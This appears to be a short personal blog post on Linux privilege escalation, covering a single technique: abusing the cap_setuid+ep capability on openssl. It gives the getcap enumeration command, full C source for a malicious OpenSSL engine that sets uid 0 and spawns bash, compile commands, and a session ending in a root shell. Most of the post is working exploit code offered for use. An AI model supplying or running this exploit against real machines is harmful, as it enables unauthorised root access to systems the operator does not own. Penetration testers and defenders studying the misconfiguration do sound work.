---
title: Linux-Priv-Esc
tags: linux privEsc
published: true
---

# Linux Priviledge Escalation methods
 would be covering some linux priviledge escalation techniques from basic to advanced here.

## OpenSSL cap_setuid+ep

>run the following command to check for the set capabilities on the target machine.  
>`getcap -r / 2>/dev/null`  
>if you see `/usr/bin/openssl = cap_setuid+ep`, we can exploit this box with this method.  
>on your attack machine you need to craft an exploit code in C.  
>For this exploit to work, you need to have the libssl-dev package installed; if you don't, you can easily install it with the following code:  
>`sudo apt-get install libssl-dev`  
>>### Time to craft the exploit:
>>Create a file named `ssl-ploit.c`, or whatever you like XD. Write the following into the file. 👻
>> ```c 
>> #include <openssl/engine.h>
>>
>>static int bind(ENGINE *e, const char *id)
>>{
>>  setuid(0); setgid(0);
>>  system("/bin/bash");
>>}
>>
>>IMPLEMENT_DYNAMIC_BIND_FN(bind)
>>IMPLEMENT_DYNAMIC_CHECK_FN()
>> ```
>>
>>### Compilattion: 
>>run the following commands:  
>>```
>>1. gcc -fPIC -o ssl-ploit.o -c ssl-ploit.c  
>>2. gcc -shared -o ssl-ploit.so -lcrypt ssl-ploit.o  
>>```
>> finally; the exploit is complete 💥. You should get a `'<whatever_name_you_saved_your_exploit_as>'.so` file. in my case, i named which is ssl-ploit.so. 
>> 
>>### Exploitation:
>>Now you've got just one more thing to do, you need to transfer the `ssl-ploit.so` file to the target machine. (you can send it to `/dev/shm` or your home directory using python webserver or scp)   
>>Then run the exploit :)
>>```javascript
>>
>>user@server$ openssl eng -engine ./ssl-ploit.so
>>root@server# whoami
>>root
>>```
>>
>> FInally Root 📸; Thanks for reading. *Sayonara~*
>> 






